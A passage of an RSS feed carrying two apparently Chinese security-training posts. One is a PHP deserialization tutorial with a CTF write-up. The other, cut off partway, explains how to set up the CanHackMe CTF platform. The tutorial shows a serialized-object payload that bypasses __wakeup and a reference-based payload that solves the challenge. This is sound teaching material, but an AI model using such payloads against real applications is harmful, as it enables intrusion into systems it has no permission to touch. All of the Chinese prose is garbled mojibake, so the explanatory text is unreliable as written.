echo serialize($test3); &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¾“å‡ºç»“æœï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:5:&amp;#34;name1&amp;#34;:2:{s:5:&amp;#34;test1&amp;#34;;s:2:&amp;#34;hi&amp;#34;;s:5:&amp;#34;test2&amp;#34;;s:3:&amp;#34;fun&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;unserialize()&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å•è¯å‰é¢åŠ ä¸ªâ€œunâ€ï¼Œå¤§å®¶éƒ½ä¸é™Œç”Ÿå§ï¼Œå°±æ˜¯è·Ÿå‰é¢ç›¸åçš„æ„æ€ï¼ŒæŠŠæ°´æœä»æœç›˜é‡Œé¢æ‹¿å‡ºæ¥ã€‚&lt;/p&gt;&lt;p&gt;æ¯”å¦‚ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
$sites = array(&amp;#39;a&amp;#39;, &amp;#39;bb&amp;#39;, &amp;#39;ccc&amp;#39;);
$serialized_data = serialize($sites);
$unserialized_data = unserialize($serialized_data);
print_r($unserialized_data);
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¾“å‡ºç»“æœï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Array
(
    [0] =&amp;gt;  a
    [1] =&amp;gt;  bb
    [2] =&amp;gt;  ccc
)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™å°±æ˜¯ PHP çš„ååºåˆ—åŒ–ï¼Œè¿”å›åŸå§‹çš„ç»“æ„ã€‚&lt;/p&gt;&lt;h2&gt;ååºåˆ—åŒ–æ¼æ´&lt;/h2&gt;&lt;p&gt;ä¸å°±æ˜¯æ”¾æ°´æœã€æ‹¿æ°´æœå—ï¼Ÿæœ‰ä»€ä¹ˆå±é™©çš„ã€‚&lt;/p&gt;&lt;p&gt;ä¸‹é¢æ¥ä»‹ç»å‡ ç§â€œæœè™«â€ï¼Œä¹Ÿå°±æ˜¯å±é™©çš„ PHP é­”æ³•å‡½æ•°ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;construct():å½“ä¸€ä¸ªç±»è¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨
destruct():å½“ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨
invoke():å½“æŠŠä¸€ä¸ªç±»å½“ä½œå‡½æ•°ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨
tostring():å½“æŠŠä¸€ä¸ªç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨
wakeup():å½“è°ƒç”¨unserialize()å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨
sleep():å½“è°ƒç”¨serialize()å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨
__call():å½“è¦è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æˆ–æƒé™ä¸è¶³æ—¶è‡ªåŠ¨è°ƒç”¨&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥çœ‹çœ‹æ˜¯æ€æ ·ç¥¸å®³æˆ‘ä»¬çš„æ°´æœçš„ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class chybeta{
	var $test = &amp;#39;123&amp;#39;;
	function __wakeup(){
		echo &amp;#34;__wakeup&amp;#34;;
		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
	}
	function __construct(){
		echo &amp;#34;__construct&amp;#34;;
		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
	}
	function __destruct(){
		echo &amp;#34;__destruct&amp;#34;;
		echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
	}
}
$class2 = &amp;#39;O:7:&amp;#34;chybeta&amp;#34;:1:{s:4:&amp;#34;test&amp;#34;;s:3:&amp;#34;123&amp;#34;;}&amp;#39;;
	print_r($class2);
echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
$class2_unser = unserialize($class2);
print_r($class2_unser);
echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;162&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;471&quot; data-original=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;unserialize() ååºåˆ—åŒ–ä¹‹åï¼Œä¼šå¯¼è‡´ wakeup() æˆ– destruct() çš„ç›´æ¥è°ƒç”¨ï¼Œå› æ­¤æœ€ç†æƒ³çš„æƒ…å†µå°±æ˜¯ä¸€äº›æ¼æ´/å±å®³ä»£ç åœ¨ wakeup() æˆ– destruct() ä¸­ï¼Œä»è€Œå½“æˆ‘ä»¬æ§åˆ¶åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶å¯ä»¥å»ç›´æ¥è§¦å‘å®ƒä»¬ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;ç»•è¿‡é­”æ³•å‡½æ•°&lt;/b&gt;&lt;/p&gt;&lt;p&gt;é­”æ³•å‡½æ•° sleep() å’Œ wakeup()&lt;/p&gt;&lt;blockquote&gt;php æ–‡æ¡£ä¸­å®šä¹‰ __wakeup():&lt;br/&gt;unserialize() æ‰§è¡Œæ—¶ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚wakeup() ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚sleep() åˆ™ç›¸åï¼Œæ˜¯ç”¨åœ¨åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶è¢«è°ƒç”¨.&lt;/blockquote&gt;&lt;p&gt;æ­£å¸¸æƒ…å†µä¸‹çš„ååºåˆ—åŒ–æ¼æ´å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1017&quot; data-rawheight=&quot;731&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1017&quot; data-original=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;ææ„æ–¹æ³•å’Œ __wakeup éƒ½èƒ½å¤Ÿæ‰§è¡Œ&lt;/p&gt;&lt;p&gt;å¦‚æœæˆ‘ä»¬æŠŠä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å±æ€§ä¸ªæ•°æ›´æ”¹æˆå¤§äº 1 çš„ä»»ä½•æ•°&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:7:&amp;#34;hpdoger&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:6:&amp;#34;u know&amp;#34;;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¾—åˆ°çš„ç»“æœå¦‚å›¾ï¼Œ__wakeup æ²¡æœ‰è¢«æ‰§è¡Œï¼Œä½†æ˜¯æ‰§è¡Œäº†ææ„å‡½æ•°&lt;/p&gt;&lt;h2&gt;CTFé¢˜å®æˆ˜&lt;/h2&gt;&lt;p&gt;&lt;b&gt;å—é‚®CTF&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class just4fun { //å®šä¹‰äº†ä¸€ä¸ªç±»
    var $enter;
    var $secret;
}
if (isset($_GET[&amp;#39;pass&amp;#39;])) {
    $pass = $_GET[&amp;#39;pass&amp;#39;];

    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }

    $o = unserialize($pass); //è¿›è¡Œååºåˆ—åŒ–å¤„ç†

    if ($o) {
        $o-&amp;gt;secret = &amp;#34;*&amp;#34;; //è¿™é‡Œä¸çŸ¥é“*ä»£è¡¨çš„æ˜¯å•¥
        if ($o-&amp;gt;secret === $o-&amp;gt;enter) //è¦æ±‚$oä¸­çš„ä¸¤ä¸ªå±æ€§å€¼ç›¸åŒ
            echo &amp;#34;Congratulation! Here is my secret: &amp;#34;.$o-&amp;gt;secret;
        else 
            echo &amp;#34;Oh no... You can&amp;#39;t fool me&amp;#34;;
    }
    else echo &amp;#34;are you trolling?&amp;#34;;
}
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”±äºæˆ‘ä»¬ä¸çŸ¥é“ * ä»£è¡¨çš„æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥ç”¨æŒ‡é’ˆæ¥ç›´æ¥è®©ä¸¤ä¸ªçš„å±æ€§ç›¸ç­‰ã€‚&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
class just4fun {
    var $enter;
    var $secret;
}
$o = new just4fun;
$o-&amp;gt;enter = &amp;amp;$o-&amp;gt;secret; //è¿™é‡Œçš„a=&amp;amp;b å³ä»£è¡¨å°†bçš„æŒ‡é’ˆèµ‹å€¼ç»™a æ— è®ºbçš„å€¼æ€ä¹ˆå˜ aå§‹ç»ˆç­‰äºb
echo serialize($o);
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ¬åœ°è¿è¡Œå³å¯å¾—åˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;O:8:&amp;#34;just4fun&amp;#34;:2:{s:5:&amp;#34;enter&amp;#34;;N;s:6:&amp;#34;secret&amp;#34;;R:2;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå°†æ­¤ä½œä¸º pass å‚æ•° GET å‘é€å³å¯è·å¾— flagã€‚&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;çš„ç½‘ç»œå®‰å…¨æŠ€èƒ½åŒ…æ›´æ–°äº†ï¼æ— éœ€ç™»å½•ã€æ— éœ€æ‰«æï¼Œåªéœ€ç‚¹å‡»ä¸‹æ–¹é“¾æ¥å³å¯ç•…ç©æŠ€èƒ½åŒ…ã€‚ï¼ˆCISP-PTE æŠ€èƒ½åŒ…ã€CTF æŠ€èƒ½åŒ…å³å°†ä¸Šçº¿ï¼Œæ•¬è¯·å…³æ³¨ï¼ï¼‰&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;æ–°æ‰‹å…¥é—¨ | æ¢¦å¢ƒç©¿è¶Š - ä¸»é¢˜æŠ€èƒ½åŒ…&lt;/a&gt;&lt;p&gt;æ›´å¤šæœ‰å…³æ¸—é€æµ‹è¯•çš„å†…å®¹è¯·å‰å¾€&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;äºŒå‘ç®”å®‰å…¨&lt;/a&gt;è¿›è¡Œå­¦ä¹ ï¼Œæœ€è¿‘æ¨å‡ºäº†â€œæŒ–æ´â€ç­ï¼Œæƒ³äº†è§£æ›´å¤šèµ„è®¯çš„ï¼Œå¯å’¨è¯¢å®¢æœå¾®ä¿¡ &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>äºŒå‘ç®”å®‰å…¨å­¦é™¢</author>
<guid isPermaLink="false">2020-01-10-102166928</guid>
<pubDate>Fri, 10 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>CTFå¹³å°æ­å»ºï¼šCanHackMe</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-09-101994123.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101994123&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8eec1bba32fd0da619e3282f391992b4_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;CanHackMeğŸ¯&lt;/h2&gt;&lt;p&gt;ä¸€ä¸ªåŸºäº php çš„ CTF å¼€æºå¹³å°ã€‚&lt;/p&gt;&lt;p&gt;å®˜ç½‘ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//canhack.me/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;ht&lt;/a&gt;tps://canhack.me/&lt;/p&gt;&lt;p&gt;é¡¹ç›®åœ°å€ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/safflower/canhackme&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/safflower/ca&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;nhackme&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;æ­å»ºç¯å¢ƒğŸ“&lt;/h2&gt;&lt;p&gt;&lt;b&gt;ç¯å¢ƒï¼ˆUbuntu 16.04+Apache 2.4+PHP 7.3ï¼‰&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;å®‰è£… Apache 2.4&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å‘½ä»¤ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt update
sudo apt install apache2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæ£€æŸ¥æ˜¯å¦æˆåŠŸï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;apache2 -v&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;444&quot; data-rawheight=&quot;89&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;444&quot; data-original=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;444&quot; data-rawheight=&quot;89&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;444&quot; data-original=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-3715489f4a091937442405ef8bab17df_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;å®‰è£… PHP 7.3&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å‘½ä»¤ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt-get install software-properties-common
sudo add-apt-repository ppa:ondrej/php
sudo apt-get update
sudo apt-get install -y php7.3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ£€æŸ¥æ˜¯å¦æˆåŠŸï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;php -v&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;142&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1053&quot; data-original=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;142&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1053&quot; data-original=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-0614cbe2c15f07977b1385af62d47e3d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;å®‰è£… Sqlite3&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;SQLite æ˜¯ä¸€ä¸ªè½¯ä»¶åº“ï¼Œå®ç°äº†è‡ªç»™è‡ªè¶³çš„ã€æ— æœåŠ¡å™¨çš„ã€é›¶é…ç½®çš„ã€äº‹åŠ¡æ€§çš„ SQL æ•°æ®åº“å¼•æ“ã€‚SQLite æ˜¯åœ¨ä¸–ç•Œä¸Šæœ€å¹¿æ³›éƒ¨ç½²çš„ SQL æ•°æ®åº“å¼•æ“ã€‚SQLite æºä»£ç ä¸å—ç‰ˆæƒé™åˆ¶ã€‚&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;å®‰è£… php-sqlite3 æ¨¡å—&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å‘½ä»¤ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install php7.3-sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œè¦ä¿®æ”¹ php.ini æ–‡ä»¶ /etc/php/7.3/apache2/php.iniï¼ŒæŠŠå‰é¢çš„åˆ†å·å»æ‰&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;extension=sqlite3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;å®‰è£… php-mbstring æ¨¡å—&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install php-mbstring&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŒæ ·çš„ï¼Œéœ€è¦ä¿®æ”¹ php.ini æ–‡ä»¶ /etc/php/7.3/apache2/php.iniï¼ŒæŠŠå‰é¢çš„åˆ†å·å»æ‰&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;extension=mbstring&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;é¡¹ç›®æ­å»º&lt;/h2&gt;&lt;p&gt;&lt;b&gt;ä¸‹è½½&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å…ˆä¸‹è½½é¡¹ç›®ï¼Œç›´æ¥ä¸‹è½½ä¸Šä¼ ï¼š&lt;/p&gt;&lt;p&gt;ä¸‹è½½åœ°å€ï¼š&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/safflower/canhackme&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/safflower/ca&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;nhackme&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;git æ–¹å¼ä¸‹è½½ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;git clone https://github.com/safflower/canhackme&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;é…ç½®è·¯ç”±&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å…ˆé…ç½®è·¯ç”±ï¼Œä¿®æ”¹ apache2 é…ç½®æ–‡ä»¶&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;vim /etc/apache2/apache2.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŠŠè·¯å¾„æ”¹æˆä½ å®é™…çš„ç½‘ç«™æ ¹ç›®å½•ï¼ŒAllowOverride None æ”¹ä¸º AllowOverride ALL&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;Directory /var/www/html&amp;gt;
        Options Indexes FollowSymLinks
        AllowOverride ALL
        Require all granted
&amp;lt;/Directory&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;å¼€å¯ mod_rewrite æ¨¡å—&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å‘½ä»¤ï¼š&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo a2enmod rewrite&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åé‡å¯ apache2&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;service apache2 restart&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;å¯¼å…¥ .sql æ•°æ®åº“æ–‡ä»¶&lt;/b&gt;&lt;/p&gt;&lt;p&gt;è¿›å…¥åˆ° @import/confs/ ç›®å½•ä¸‹ï¼Œå¯¼å…¥ init.sql æ–‡ä»¶åˆ° sqlite3&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sqlite3 .common.db &amp;lt; init.sql
root@linuz:/var/www/html/@import/confs# sqlite3 .common.db
SQLite version 3.11.0 2016-02-15 17:29:24
Enter &amp;#34;.help&amp;#34; for usage hints.
sqlite&amp;gt; .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE `users` (
        `user_no` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        `user_name` TEXT NOT NULL UNIQUE,
        `user_email` TEXT NOT NULL UNIQUE,
        `user_password` TEXT NOT NULL,
        `user_comment` TEXT NOT NULL,
        `user_score` INTEGER NOT NULL,
        `user_signed_up_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);
......
